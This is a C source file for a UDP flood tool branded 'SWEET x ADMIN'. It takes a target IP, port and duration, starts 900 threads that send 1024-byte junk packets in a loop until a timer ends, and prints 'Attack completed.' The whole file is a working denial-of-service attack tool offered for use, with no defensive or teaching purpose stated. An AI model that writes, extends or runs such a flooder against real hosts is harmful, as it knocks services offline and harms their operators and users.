// Filename: sead.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>

#define THREADS 900
#define PAYLOAD_SIZE 1024

char *target_ip;
int target_port;
int attack_time;
volatile int attack_running = 1;

void print_banner() {
    const char *red = "\033[1;31m";  // Bright Red
    const char *reset = "\033[0m";   // Reset color

    printf("\n%s", red);
    printf(" ███████╗██╗    ██╗███████╗███████╗████████╗    ██╗  ██╗     ██╗  ██╗\n");
    printf(" ██╔════╝██║    ██║██╔════╝██╔════╝╚══██╔══╝    ╚██╗██╔╝     ╚██╗██╔╝\n");
    printf(" █████╗  ██║ █╗ ██║█████╗  █████╗     ██║        ╚███╔╝       ╚███╔╝ \n");
    printf(" ██╔══╝  ██║███╗██║██╔══╝  ██╔══╝     ██║        ██╔██╗       ██╔██╗ \n");
    printf(" ███████╗╚███╔███╔╝███████╗███████╗   ██║       ██╔╝ ██╗     ██╔╝ ██╗\n");
    printf(" ╚══════╝ ╚══╝╚══╝ ╚══════╝╚══════╝   ╚═╝       ╚═╝  ╚═╝     ╚═╝  ╚═╝\n");
    printf("                             SWEET x ADMIN\n\n");
    printf("             POWERED BY SAHIL | STRONG UDP ATTACK LAUNCHING...\n\n");
    printf("%s", reset);
}

void *attack_thread(void *arg) {
    struct sockaddr_in target;
    int sock;
    char payload[PAYLOAD_SIZE];
    memset(payload, 'X', PAYLOAD_SIZE); // Payload 'X' se bhara

    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    target.sin_addr.s_addr = inet_addr(target_ip);

    while (attack_running) {
        sock = socket(AF_INET, SOCK_DGRAM, 0); // UDP socket
        if (sock < 0) continue;
        sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
        close(sock);
    }

    pthread_exit(NULL);
}

void *countdown_timer(void *arg) {
    int seconds = (int)(intptr_t)arg;
    sleep(seconds);
    attack_running = 0;
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    print_banner(); // Display banner

    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        return 1;
    }

    target_ip = argv[1];
    target_port = atoi(argv[2]);
    attack_time = atoi(argv[3]);

    pthread_t threads[THREADS];
    pthread_t timer_thread;

    printf("Launching %d threads attack on %s:%d for %d seconds...\n\n", THREADS, target_ip, target_port, attack_time);

    // Start timer thread
    pthread_create(&timer_thread, NULL, countdown_timer, (void *)(intptr_t)attack_time);

    // Start attack threads
    for (int i = 0; i < THREADS; i++) {
        pthread_create(&threads[i], NULL, attack_thread, NULL);
    }

    // Wait for timer thread to finish
    pthread_join(timer_thread, NULL);

    // Wait for all attack threads to finish
    for (int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\nAttack completed.\n");
    return 0;
}
